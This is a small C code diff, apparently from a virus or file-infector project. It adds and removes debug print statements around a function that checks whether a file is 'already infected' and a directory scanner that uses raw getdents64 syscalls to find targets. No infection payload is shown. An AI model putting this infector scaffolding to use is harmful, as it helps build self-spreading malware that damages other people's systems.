@@ -24,8 +24,6 @@ int FORCE_INLINE is_good_format(char *filename)
 		return (-1);
 	}
 	// verify if not alread infected
-	ft_putnbr(fd);
-	WRITE(1, "  OK\n", 5);
 	return (fd);
 }
 
@@ -36,8 +34,13 @@ int finder(t_data data, int dir_fd)
 	struct linux_dirent64 *d;
 	char	buf[BUF_SIZE];
 
+	ft_putchar('2');
+	ft_putchar('\n');
 	while(1)
 	{
+//		ft_putchar('2');
+//		ft_putchar('l');
+//		ft_putchar('\n');
 		nread = syscall3(SYS_GETDENT64, (u64)dir_fd, (u64)buf, (u64)BUF_SIZE);
 		if (!nread || nread == -1)
 			return (0);
